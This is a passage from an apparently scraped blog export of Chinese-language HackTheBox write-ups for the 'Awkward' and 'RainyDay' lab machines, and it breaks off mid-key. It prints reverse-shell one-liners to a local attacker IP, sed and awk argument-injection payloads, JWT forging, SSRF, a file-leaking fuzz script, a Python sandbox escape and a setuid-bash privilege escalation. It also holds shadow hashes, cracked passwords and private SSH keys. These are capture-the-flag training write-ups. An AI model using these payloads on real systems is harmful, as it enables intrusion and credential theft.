~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u \"http://hat-valley.htb/\" -H 'Host: FUZZ.hat-valley.htb' -fs 132store [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 201ms] 需要登录： #hat-valley.htb hr to dashboardhttp://hat-valley.htb/hr 也是需要登录，默认cookie是guest，修改为其他任意，可以访问到dashboard： staff-detailsstaff-details api 未授权，得到一些用户名和密码hash，可以破解出来其中christopher.jones的密码： 123456curl http:&#x2F;&#x2F;hat-valley.htb&#x2F;api&#x2F;staff-details | jq&quot;username&quot;: &quot;christopher.jones&quot;,&quot;password&quot;: &quot;e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1&quot;, chris123 hr again回到hr那里，得到的账号密码正常登录，得到有效JWT，JWT也可以破解出来密钥： 123python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2Njc3MTE2fQ.hNfctPivZ8nIAbiyDgE_sKMUxTrvJs0xu1S2SKhzAWw -d ~/Tools/dict/rockyou.txt -C[+] 123beany123 is the CORRECT key! store-status SSRFstore-status那里可以SSRF，发现3002端口泄漏代码： 1http:&#x2F;&#x2F;hat-valley.htb&#x2F;api&#x2F;store-status?url&#x3D;%22http:%2F%2F127.0.0.1:3002%22 awk 参数注入 查看上面的代码，之前是有非预期命令注入的，现在已经修复了，预期方案是jwt伪造用户名，注入到awk中，达成任意文件读取效果： 1234567exec(\"awk '/\" + user + \"/' /var/www/private/leave_requests.csv\", &#123;encoding: 'binary', maxBuffer: 51200000&#125;, (error, stdout, stderr) =&gt; &#123;python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2Njc3MTE2fQ.hNfctPivZ8nIAbiyDgE_sKMUxTrvJs0xu1S2SKhzAWw -pc username -pv \"/' /etc/passwd 'a\" -p 123beany123 -S hs256 -I\"awk '/\" + /' /etc/passwd 'a + \"/' /var/www/private/leave_requests.csv\"\"awk '/\"/' /etc/passwd 'a\"/' /var/www/private/leave_requests.csv\" LFI一步步读取文件，得到bean用户的密码 /home/bean/.bashrc1234python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2Njc3MTE2fQ.hNfctPivZ8nIAbiyDgE_sKMUxTrvJs0xu1S2SKhzAWw -pc username -pv \"/' /home/bean/.bashrc 'a\" -p 123beany123 -S hs256 -I# customalias backup_home='/bin/bash /home/bean/Documents/backup_home.sh' /home/bean/Documents/backup_home.sh12345678910python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2Njc3MTE2fQ.hNfctPivZ8nIAbiyDgE_sKMUxTrvJs0xu1S2SKhzAWw -pc username -pv \"/' /home/bean/Documents/backup_home.sh 'a\" -p 123beany123 -S hs256 -I#!/bin/bashmkdir /home/bean/Documents/backup_tmpcd /home/beantar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .date &gt; /home/bean/Documents/backup_tmp/time.txtcd /home/bean/Documents/backup_tmptar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .rm -r /home/bean/Documents/backup_tmp bean_backup_final.tar.gz这个压缩包中的另一个压缩包，配置文件中得到bean的密码 1234python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY2Njc3MTE2fQ.hNfctPivZ8nIAbiyDgE_sKMUxTrvJs0xu1S2SKhzAWw -pc username -pv \"/' /home/bean/Documents/backup/bean_backup_final.tar.gz 'a\" -p 123beany123 -S hs256 -Ibean.hill014mrbeanrules!#P user flagbean ssh登录： storestore前面看是需要密码的，现在可以去读配置文件，破解不出来，但其实就是bean用户的密码： 123456bean@awkward:/var/www/store$ cat /etc/nginx/conf.d/.htpasswdadmin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt014mrbeanrules!#P 结合代码中相关说明，现在没有使用数据库，使用本地文件进行相关处理 代码审计发现，cart_actions.php中删除cart时调用sed，可以进行命令注入，但过滤了很多字符，不能直接使用gtfobins中常规利用方式： 123$bad_chars = array(\";\",\"&amp;\",\"|\",\"&gt;\",\"&lt;\",\"*\",\"?\",\"`\",\"$\",\"(\",\")\",\"&#123;\",\"&#125;\",\"[\",\"]\",\"!\",\"#\"); //no hacking allowed!!system(\"sed -i '/item_id=&#123;$item_id&#125;/d' &#123;$STORE_HOME&#125;cart/&#123;$user_id&#125;\"); 查看sed文档，可以发现-e参数： 1-e script, --expression&#x3D;script add the script to the commands to be executed 所以可以像这样进行利用： 1234system(\"sed -i '/item_id=&#123;$item_id&#125;/d' &#123;$STORE_HOME&#125;cart/&#123;$user_id&#125;\");$item_id = ' -e \"1e /tmp/shell.sh\" /tmp/shell.sh ' &lt;----- our inputsystem(\"sed -i '/item_id=' -e \"1e /tmp/shell.sh\" /tmp/shell.sh '/d' &#123;$STORE_HOME&#125;cart/&#123;$user_id&#125;\"); &lt;----- this will be executed in the sed command cart_actions.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107&lt;?php$STORE_HOME = \"/var/www/store/\";//check for valid hat valley store itemfunction checkValidItem($filename) &#123; if(file_exists($filename)) &#123; $first_line = file($filename)[0]; if(strpos($first_line, \"***Hat Valley\") !== FALSE) &#123; return true; &#125; &#125; return false;&#125;//add to cartif ($_SERVER['REQUEST_METHOD'] === 'POST' &amp;&amp; $_POST['action'] === 'add_item' &amp;&amp; $_POST['item'] &amp;&amp; $_POST['user']) &#123; $item_id = $_POST['item']; $user_id = $_POST['user']; $bad_chars = array(\";\",\"&amp;\",\"|\",\"&gt;\",\"&lt;\",\"*\",\"?\",\"`\",\"$\",\"(\",\")\",\"&#123;\",\"&#125;\",\"[\",\"]\",\"!\",\"#\"); //no hacking allowed!! foreach($bad_chars as $bad) &#123; if(strpos($item_id, $bad) !== FALSE) &#123; echo \"Bad character detected!\"; exit; &#125; &#125; foreach($bad_chars as $bad) &#123; if(strpos($user_id, $bad) !== FALSE) &#123; echo \"Bad character detected!\"; exit; &#125; &#125; if(checkValidItem(\"&#123;$STORE_HOME&#125;product-details/&#123;$item_id&#125;.txt\")) &#123; if(!file_exists(\"&#123;$STORE_HOME&#125;cart/&#123;$user_id&#125;\")) &#123; system(\"echo '***Hat Valley Cart***' &gt; &#123;$STORE_HOME&#125;cart/&#123;$user_id&#125;\"); &#125; system(\"head -2 &#123;$STORE_HOME&#125;product-details/&#123;$item_id&#125;.txt | tail -1 &gt;&gt; &#123;$STORE_HOME&#125;cart/&#123;$user_id&#125;\"); echo \"Item added successfully!\"; &#125; else &#123; echo \"Invalid item\"; &#125; exit;&#125;//delete from cartif ($_SERVER['REQUEST_METHOD'] === 'POST' &amp;&amp; $_POST['action'] === 'delete_item' &amp;&amp; $_POST['item'] &amp;&amp; $_POST['user']) &#123; $item_id = $_POST['item']; $user_id = $_POST['user']; $bad_chars = array(\";\",\"&amp;\",\"|\",\"&gt;\",\"&lt;\",\"*\",\"?\",\"`\",\"$\",\"(\",\")\",\"&#123;\",\"&#125;\",\"[\",\"]\",\"!\",\"#\"); //no hacking allowed!! foreach($bad_chars as $bad) &#123; if(strpos($item_id, $bad) !== FALSE) &#123; echo \"Bad character detected!\"; exit; &#125; &#125; foreach($bad_chars as $bad) &#123; if(strpos($user_id, $bad) !== FALSE) &#123; echo \"Bad character detected!\"; exit; &#125; &#125; if(checkValidItem(\"&#123;$STORE_HOME&#125;cart/&#123;$user_id&#125;\")) &#123; system(\"sed -i '/item_id=&#123;$item_id&#125;/d' &#123;$STORE_HOME&#125;cart/&#123;$user_id&#125;\"); echo \"Item removed from cart\"; &#125; else &#123; echo \"Invalid item\"; &#125; exit;&#125;//fetch from cartif ($_SERVER['REQUEST_METHOD'] === 'GET' &amp;&amp; $_GET['action'] === 'fetch_items' &amp;&amp; $_GET['user']) &#123; $html = \"\"; $dir = scandir(\"&#123;$STORE_HOME&#125;cart\"); $files = array_slice($dir, 2); foreach($files as $file) &#123; $user_id = substr($file, -18); if($user_id === $_GET['user'] &amp;&amp; checkValidItem(\"&#123;$STORE_HOME&#125;cart/&#123;$user_id&#125;\")) &#123; $product_file = fopen(\"&#123;$STORE_HOME&#125;cart/&#123;$file&#125;\", \"r\"); $details = array(); while (($line = fgets($product_file)) !== false) &#123; if(str_replace(array(\"\\r\", \"\\n\"), '', $line) !== \"***Hat Valley Cart***\") &#123; //don't include first line array_push($details, str_replace(array(\"\\r\", \"\\n\"), '', $line)); &#125; &#125; foreach($details as $cart_item) &#123; $cart_items = explode(\"&amp;\", $cart_item); for($x = 0; $x &lt; count($cart_items); $x++) &#123; $cart_items[$x] = explode(\"=\", $cart_items[$x]); //key and value as separate values in subarray &#125; $html .= \"&lt;tr&gt;&lt;td&gt;&#123;$cart_items[1][1]&#125;&lt;/td&gt;&lt;td&gt;&#123;$cart_items[2][1]&#125;&lt;/td&gt;&lt;td&gt;&#123;$cart_items[3][1]&#125;&lt;/td&gt;&lt;td&gt;&lt;button data-id=&#123;$cart_items[0][1]&#125; onclick=\\\"removeFromCart(this, localStorage.getItem('user'))\\\" class='remove-item'&gt;Remove&lt;/button&gt;&lt;/td&gt;&lt;/tr&gt;\"; &#125; &#125; &#125; echo $html; exit;&#125;?&gt; www-data shell在购物车中添加一个商品，然后去服务器上查看文件： 123bean@awkward:/var/www/store/cart$ cat 557e-1746-524-ee64***Hat Valley Cart***item_id=1&amp;item_name=Yellow Beanie&amp;item_brand=Good Doggo&amp;item_price=$39.90 我们不能直接编辑这个文件，但我们可以删除文件后创建一个新的： 1234567891011bean@awkward:/var/www/store/cart$ rm 557e-1746-524-ee64rm: remove write-protected regular file '557e-1746-524-ee64'? ybean@awkward:/var/www/store/cart$ nano 557e-1746-524-ee6bean@awkward:/var/www/store/cart$ cat 557e-1746-524-ee64***Hat Valley Cart***item_id=1' -e \"1e /tmp/shell.sh\" /tmp/shell.sh '&amp;item_name=Yellow Beanie&amp;item_brand=Good Doggo&amp;item_price=$39.90bean@awkward:/var/www/store/cart$ cat /tmp/shell.sh#!/bin/bashbash -i &gt;&amp; /dev/tcp/10.10.14.3/4444 0&gt;&amp;1 修改完成后删除购物车中商品，删除时同样要拦截请求修改其中数据，触发命令执行： 这样得到的是www-data shell: 提权信息运行pspy可以发现，当有新的请假请求时，会调用mail命令拼接对应csv文件中的name，这个文件我们现在的www-data有权限编辑： 所以这里是另一个命令注入 提权 &amp; root flag1234567bean@awkward:/var/www/store/cart$ cat /tmp/priv.sh#!/bin/bashchmod +s /bin/bashbean@awkward:/var/www/store/cart$ chmod 777 /tmp/priv.shwww-data@awkward:~/private$ echo '\" --exec=\"\\!/tmp/priv.sh\"' &gt;&gt; leave_requests.csv shadow123root:$y$j9T$ZIlTVYLPszqZujGML5.&#x2F;W.$HD3g2FwVlePYbdiEVZ7YyKXtIl3IoenZkQLVx5VhH92:19250:0:99999:7:::bean:$y$j9T$0oEkN6BXZ6CRpf&#x2F;T8roPn&#x2F;$bjeeSZqTdNXg7K2mosuZVCYqEfBP.M6isvq.mro0Ii0:19250:0:99999:7:::christine:$y$j9T$a&#x2F;zXQvT00y0B4j75qhmWw&#x2F;$YVcc67qoysqts2Gf51.SChXv8Y1mPEV&#x2F;w3Bh&#x2F;g&#x2F;Ok8D:19250:0:99999:7::: 参考资料 Awkward - HTB [Discussion] | BreachForumshttps://breached.to/Thread-Awkward-HTB-Discussion HackTheBox (HTB) Writeup: Awkward [Medium] – meowmeowattackhttps://meowmeowattack.wordpress.com/2022/10/24/hackthebox-htb-writeup-awkward/ Hackthebox Awkward Writeup | 0xDedinfosec Bloghttps://0xdedinfosec.vercel.app/post/hackthebox-awkward-writeup","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"RainyDay - HackTheBox","slug":"RainyDay-HackTheBox","date":"2022-10-18T07:19:22.000Z","updated":"2023-02-20T00:58:16.896Z","comments":true,"path":"2022/10/18/RainyDay-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/10/18/RainyDay-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/502 10.10.11.184 端口扫描22和80: 1234567891011121314151617$ nmap -sC -sV -Pn 10.10.11.184Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-18 13:01 CSTNmap scan report for 10.10.11.184Host is up (0.21s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 256 48dde361dc5d5878f881dd6172fe6581 (ECDSA)|_ 256 adbf0bc8520f49a9a0ac682a2525cd6d (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://rainycloud.htb|_http-server-header: nginx/1.18.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 77.90 seconds 80需要加hosts,一个hosting service： 110.10.11.184 rainycloud.htb 注册功能不可用，登录错误时源码中提示信息，知道路径和后端使用python： 子域名扫描子域名可以发现一个dev,响应403： 123ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u \"http://rainycloud.htb/\" -H 'Host: FUZZ.rainycloud.htb' -fs 229dev [Status: 403, Size: 26, Words: 5, Lines: 1, Duration: 264ms] 目录扫描目录扫描发现api： 1234567gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt -t 50 -u http://rainycloud.htb/api (Status: 308) [Size: 239] [--&gt; http://rainycloud.htb/api/]/login (Status: 200) [Size: 3254]/logout (Status: 302) [Size: 189] [--&gt; /]/new (Status: 302) [Size: 199] [--&gt; /login]/register (Status: 200) [Size: 3686] api/user能发现应该是存在3个用户，但直接访问提示不允许查看其他用户信息，简单的绕过： 1234567891011121314151617gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt -t 50 -u http://rainycloud.htb/api/user/ --exclude-length 3/01 (Status: 200) [Size: 50]/03 (Status: 200) [Size: 50]/1 (Status: 200) [Size: 50]/02 (Status: 200) [Size: 50]/2 (Status: 200) [Size: 50]/3 (Status: 200) [Size: 50]$ curl \"http://rainycloud.htb/api/user/1\"&#123;\"Error\":\"Not allowed to view other users info!\"&#125;$ curl \"http://rainycloud.htb/api/user/1.0\"&#123;\"id\":1,\"password\":\"$2a$10$bit.DrTClexd4.wVpTQYb.FpxdGFNPdsVX8fjFYknhDwSxNJh.O.O\",\"username\":\"jack\"&#125;&#123;\"id\":2,\"password\":\"$2a$05$x4nSvCqGHZBmBQnmNM2nXeWDzVvvsXaJiHsSv1pwZnxrcBFbOibZS\",\"username\":\"root\"&#125;&#123;\"id\":3,\"password\":\"$2b$12$WTik5.ucdomZhgsX6U/.meSgr14LcpWXsCA0KxldEw8kksUtDuAuG\",\"username\":\"gary\"&#125; hash crack得到的三条hash进行破解，能解出来gary的密码： 123sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txtrubberducky (?) Containers得到的账号密码登录，创建一个容器，容器中运行任意命令，得到容器shell： 1python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.15\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")' chisel前面的结果发现有dev子域名，外部访问是403，考虑打通隧道后访问： 1234567# local./chisel_1.7.0-rc7_darwin_amd64 server -p 9999 --reverse# 容器内wget http://10.10.14.15:7777/chisel_1.7.6_linux_amd64chmod +x chisel_1.7.6_linux_amd64./chisel_1.7.6_linux_amd64 client --max-retry-count=1 10.10.14.15:9999 R:8888:172.18.0.1:80 然后添加hosts： 1127.0.0.1 dev.rainycloud.htb 然后可以访问到dev： dev.rainycloud.htbdev也有一些api，其中有一个healthcheck： healthcheck这个接口支持post请求，需要的参数根据前面得到的响应构造： 很明显是提供正则匹配对应文件内容，结果为true和false，那就可以fuzz出任意文件内容了 SECRET_KEY根据前面的信息可以知道是python，所以fuzz SECRET_KEY： 1file&#x3D;&#x2F;var&#x2F;www&#x2F;rainycloud&#x2F;FUZZ.py&amp;type&#x3D;custom&amp;pattern&#x3D;^SECRET_KEY.*&#39; fuzz出内容： 1f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67 file_fuzz.py1234567891011121314151617181920212223242526import stringimport requestsimport jsonallchars = string.printablecookies = &#123;'session': 'session_cookie'&#125;s = requests.Session()pattern = \"\"while True: for c in allchars: try: rsp = s.post('http://dev.rainycloud.htb:8888/api/healthcheck', &#123; 'file': '/var/www/rainycloud/secrets.py', 'type': 'custom', 'pattern': \"^SECRET_KEY = '\" + pattern + c + \".*\" &#125;, cookies=cookies) if json.loads(rsp.content)['result']: pattern += c print(pattern) break else: print(c) except Exception: print(rsp.content) jack secrets有了secret，就可以伪造任意ookie了，直接修改为前面得到的另一个用户jack： 123flask-unsign --sign --cookie \"&#123;'username': 'jack'&#125;\" --secret 'f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67'eyJ1c2VybmFtZSI6ImphY2sifQ.Y05Gog.GRPXrP7KBA6mP1OiM9H9cWyiWFk 替换cookie，可以看到jack用户的secrets容器： 同样的方法拿到这个容器shell,查看进程发现一个sleep，这个进程有一个挂载，得到jack的私钥： jack_id_rsa1234567891011121314151617181920212223242526272829303132333435363738-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEA7Ce&#x2F;LAvrYP84rAa7QU51Y+HxWRC5qmmVX4wwiCuQlDqz73uvRkXqqdDbDtTCnJUVwNJIFr4wIMrXAOvEp0PTaUY5xyk3KW4x9S1Gqu8sV1rft3Fb7rY1RxzUowSjS+Ew+ws4cpAdl&#x2F;BvrCrw9WFwEq7QcskUCON145N06NJqPgqJ7Z15Z63NMbKWRhvIoPROJDhAaulvxjKdJr7AqKAnt+pIJYDkDeAfYuPYghJN&#x2F;neeRPan3ue3iExiLdk7OA&#x2F;8PkEVF0&#x2F;pLldRcUB09RUIoMPm8CR7ES&#x2F;58p9MMHIHYWztcMtjz7mAfTcbwczq5YX3eNbHo9YFpo95MqTueSxiSKsOQjPIpWPJ9LVHFyCEOW5ONR&#x2F;NeWjxCEsaIz2NzFtPq5tcaLZbdhKnyaHE6km2eS8i8uVlMbY&#x2F;XnUpRR1PKvWZwiqlzb4F89AkqnFooztdubdFbozV0vM7UhqKxtmMAtnua20uKD7bZV8W&#x2F;rWvl5UpZ2A+0UEGicsAecT4kUghAAAFiHftftN37X7TAAAAB3NzaC1yc2EAAAGBAOwnvywL62D&#x2F;OKwGu0FOdWPh8VkQuapplV+MMIgrkJQ6s+97r0ZF6qnQ2w7UwpyVFcDSSBa+MCDK1wDrxKdD02lGOccpNyluMfUtRqrvLFda37dxW+62NUcc1KMEo0vhMPsLOHKQHZfwb6wq8PVhcBKu0HLJFAjjdeOTdOjSaj4Kie2deWetzTGylkYbyKD0TiQ4QGrpb8YynSa+wKigJ7fqSCWA5A3gH2Lj2IISTf53nkT2p97nt4hMYi3ZOzgP&#x2F;D5BFRdP6S5XUXFAdPUVCKDD5vAkexEv+fKfTDByB2Fs7XDLY8+5gH03G8HM6uWF93jWx6PWBaaPeTKk7nksYkirDkIzyKVjyfS1RxcghDluTjUfzXlo8QhLGiM9jcxbT6ubXGi2W3YSp8mhxOpJtnkvIvLlZTG2P151KUUdTyr1mcIqpc2+BfPQJKpxaKM7Xbm3RW6M1dLzO1IaisbZjALZ7mttLig+22VfFv61r5eVKWdgPtFBBonLAHnE+JFIIQAAAAMBAAEAAAGAB0Sd5JwlTWHte5Xlc3gXstBEXkpefHktaLhm0foNRBKecRNsbIxAUaOk6krwBmOsPLf8Ef8eehPkFBotfjxfKFFJ+&#x2F;Avy22hyfrvvtkHk1Svp&#x2F;SsMKeY8ixX+wBsiixPFprczOHUl1WGClVz&#x2F;wlVqq2Iqs+3dyKRAUULhxLaxDgM0KxVDTTTKOFnMJcwUIvUT9cPXHr8vqvWHFgok8gCEO379HOIEUlBjgiXJEGt9tP1oge5WOnmwyIer2yNHweW26xyaSgZjZWP6z9Il1Gab0ZXRu1sZYadcEXZcOQT6frZhlF&#x2F;DxpmgbdtejlRcUaI86mrwPFAP1PClLMlilroEaHCl8Dln5HEqnkpoNaJyg8di1pud+rJwlQwZyL6xnJ0Ke4ul3fDWpYnO&#x2F;t8q5DQgnIhRKwyDGSM7M6DqBXi8CHSbPITzOMaiWgNzue49D7ejAWa2sSlHJYhS0Uxpa7xQ3LslsnnysxIsZHKwmaMerKMGRmpoV2h5&#x2F;VnXVeiEMIxAAAAwQCoxMsk1JPEelb6bcWIBcJ0AuU5f16fjlYZMRLP75x&#x2F;el1&#x2F;KYo3J9gk+9BMw9AcZasX7QLOsbVdL45y14IIe6hROnj&#x2F;3b8QPsmyEwGc13MYC0jgKN7ggUxkp4BPH4EPbPfouRkj7WWLUwVjOxsPTXt2taMn5blhEF2+YwH5hyrVS2kW4CPYHeVMa1+RZl5&#x2F;xObp&#x2F;A62X&#x2F;CWHY9CMInY9sRDI415LvIgofRqEdYgCdC6UaE&#x2F;MSuDiuI0QcsyGucQlMQAAADBAPFAnhZPosUFnmb9Plv7lbz9bAkvdcCHC46RIrJzJxWo5EqizlEREcw&#x2F;qerre36UFYRIS7708Q9FELDV9dkodP3xAPNuM9OCrD0MLBiReWq9WDEcmRPdc2nWM5RRDqcBPJy5+gsDTVANerpOznu7I9t5Jt+69Stx6TypwWshB+4pqECgiUfR8H1UNwSClU8QLVmDmXJmYScD&#x2F;jTU4z3yHRaVzGinxOwDVGPITC9yJXJgWTSFQC8UUjrqI7cRoFtI9QAAAMEA+pddCQ8pYvVdI36BiDG41rsdM0ZWCxsJsXDQ7yS5MmlZmIMH5s1J&#x2F;wgL90V9y7keubaJxw1aEgXBa6HBuz8lMiAx7DgEMospHBO00p92XFjtlFMwCX6V+RW+aO0D+mxmhgP3q3UDcVjW&#x2F;Xar7CW57beLRFoyAyUS0YZNP7USkBZgFXc7fxSlEqYqctfe4fZKBxV68i&#x2F;c+LDvg8MwoA5HJZxWl7a9zWux7JXcrloll6+Sbsro7SbU2hJSEWRZDLb9AAAADWphY2tAcmFpbnlkYXkBAgMEBQ&#x3D;&#x3D;-----END OPENSSH PRIVATE KEY----- user flagjack ssh 私钥登录： jack_admjack可以以jack_adm身份运行指定程序,看名字就知道是python沙盒逃逸类型： 沙盒逃逸 The Craziest Python Sandbox Escape | Reelix’s Site of Stuffhttps://www.reelix.za.net/2021/04/the-craziest-python-sandbox-escape.html 12345().__class__.__mro__[1].__subclasses__()[144] -&gt; warnings.catch_warningsecho 'print(().__class__.__mro__[1].__subclasses__()[144].__init__.__globals__[\"__builtins__\"][\"__loader__\"]().load_module(\"builtins\").__import__(\"os\").system(\"whoami\"))' &gt; /tmp/test &amp;&amp; sudo -u jack_adm /usr/bin/safe_python /tmp/testecho 'print(().__class__.__mro__[1].__subclasses__()[144].__init__.__globals__[\"__builtins__\"][\"__loader__\"]().load_module(\"builtins\").__import__(\"os\").system(\"bash -i\"))' &gt; /tmp/test &amp;&amp; sudo -u jack_adm /usr/bin/safe_python /tmp/test 提权信息只有一个看起来是指定密码加salt后生成hash的程序，密码为空得到的hash破解出来salt,使用salt生成新字典破解前面在api/user那里得到的root hash： 123456789sudo john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/md5decryptor-uk.txtSup3rDup3rsed 's/$/Sup3rDup3r/' /usr/share/wordlists/rockyou.txt &gt; newrockyou.txtsudo john --wordlist=newrockyou.txt hash.txt246813579Sup3rDup3r root flag破解出来的密码切到root： (这个box太CTF了) shadow123root:$y$j9T$5SIveCET7DEtfdvKf0xbB1$XK4FfV4Ud4KKP3tJGSpYrYQDFofln6ZOP3jbd2O1mL6:19256:0:99999:7:::jack:$y$j9T$ldTcnggvK0yHbGNv0.aKi0$vpHrVNFy1sfJecOtDaaQiKK8Da2AFG7fYUyJwDC5Gg0:19131:0:99999:7:::jack_adm:$y$j9T$6eiMKhY4J8eSrAtVSP44K0$U6UClG5Inrs5fAtJQy3gjZJ99YGd.7VocPcWs.78C25:19147:0:99999:7::: root_id_rsa1234567891011121314151617181920212223242526272829303132333435363738-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAvmri&#x2F;DfrS3yLNn5Zy+&#x2F;kRfeYsZXQY9WCU6y6&#x2F;VdBRcBu&#x2F;ibWNYlky41YpFDQYgVDwLaJVK8DkpiuUBsqBjw5brra5KLMKv&#x2F;ZU6oF17gj6q38WWzFMR8OxR3J6Gy37eBliXvnrPZLHJA5JZ1bKzCiG0ZBwV6YC9MhY4RYV831LjVwz+Fs5viMQzVpL01&#x2F;crI8wSVOxuLXPfbR4Zvxc+uuxeAy8EIg2qGfyyADnNYT50LzpxJVZcjBYUofyljEDkvoEQZiLAJD2kP9FOKbkGR+4XEmT952tf06ct&#x2F;0pOLCX87NluOuu9z2vtgzFUDXSHyA&#x2F;fOPluHwaJTTXD17uC5jU8TY0y1z8HiqimPWcGm5zRXipUmKIOG6fVMTdl9QoR1rv5ObfBYMl3yMC6TE1TQVaizKNNy+9dFHhTZPr2D2gGoJFQCkjibgQ1wIYkr&#x2F;lp0tLor48ZiJ6wHMc9RneO2CLsoB79jh8V50pvGEsLOamMhKC03UrsrFfmjam6LL92OVAAAFiJuCzs+bgs7PAAAAB3NzaC1yc2EAAAGBAL5q4vw360t8izZ+Wcvv5EX3mLGV0GPVglOsuv1XQUXAbv4m1jWJZMuNWKRQ0GIFQ8C2iVSvA5KYrlAbKgY8OW662uSizCr&#x2F;2VOqBde4I+qt&#x2F;FlsxTEfDsUdyehst+3gZYl756z2SxyQOSWdWyswohtGQcFemAvTIWOEWFfN9S41cM&#x2F;hbOb4jEM1aS9Nf3KyPMElTsbi1z320eGb8XPrrsXgMvBCINqhn8sgA5zWE+dC86cSVWXIwWFKH8pYxA5L6BEGYiwCQ9pD&#x2F;RTim5BkfuFxJk&#x2F;edrX9OnLf9KTiwl&#x2F;OzZbjrrvc9r7YMxVA10h8gP3zj5bh8GiU01w9e7guY1PE2NMtc&#x2F;B4qopj1nBpuc0V4qVJiiDhun1TE3ZfUKEda7+Tm3wWDJd8jAukxNU0FWosyjTcvvXRR4U2T69g9oBqCRUApI4m4ENcCGJK&#x2F;5adLS6K+PGYiesBzHPUZ3jtgi7KAe&#x2F;Y4fFedKbxhLCzmpjISgtN1K7KxX5o2puiy&#x2F;djlQAAAAMBAAEAAAGAC7RtTHyxeXvn4MsmgOs3mHduSug&#x2F;HYvnzXXuLpl4+S0phXTksPjHmd2P59XR4VyafBOcYHi7mvzIpkLtM+Hq09wnjWtWaoQ8mzB12HtItenI+8Q8YNccZNB+c0uPiM9E3o0fwhmHp3NUF&#x2F;RSwNZl+JA6hYTnir6JLGFbvtX5rsP5McYVGCOKF62GUDKO1YGQS30cGQyjl3r&#x2F;DsOztWD05tPvvaYK9&#x2F;V8aZOHtVHRemM6r&#x2F;foCPAsturEBn+rWYef2oz+rkvDnQ6suOyR5lnPQkCjYAa3Dypb4JPoQI1owom1TZPHn&#x2F;fwVsmTG8X4vacuU&#x2F;7lIVlrMQTPOFVZnp6GUDvkdDIDaejSbtrKzd3HgYKskqsQTsoRy0G8WjzNqmG+AkObbMztyKkUn4JaWMBu+1Ih6ktjcZHWbqFExwSiN8hNtgMyLnNlZ+znDu5pWtL3KPIDIHZQKXkkcxQk8d9ZI&#x2F;93kHRuS5aapFQRhpHGNxGrB8WiuReUMg7pSzGwvNHXAAAAwEiT1K8kV7sGj&#x2F;vc1hKRgEDLV4y2HFgB+u7u6VuBJrXhkQOSXbrr1nLezugFRYk60aovOKvLOiWz+h8XN0ej9xA&#x2F;Bc6kuRvshHHvnA&#x2F;C7dzycowwzA5kpBO65VTzRsMbCHkPhosLhDCduTYdUyeHGNy5b6K8iQvxXnftFrl8Nd9jel4uU41ZncRXutaf7oW90BqV+gMMyZ8StIOHkb2jPmSN47W7QhU9qnd+I&#x2F;SdoA6bNoBHE3+pSg7Re0K0Ux5qRAAAAMEAzxC5hKDH0pMsoZWM7w71c8ogLfjYq&#x2F;fzjFD&#x2F;&#x2F;eSlrolCv90rtCZrkR63zeEsJ0EBwCNPNHpB34ThRD4LwBTZ+UjXwWHwXwsg599xjPOGwsDd48lsi6UedANqHD&#x2F;lLxJWVBZpYuZPHY2ReMRz+cB340Z5p5khjbCBrxoeIymL9iF9TG01BqKJY+lCzUyW3ye3+&#x2F;87BQ&#x2F;K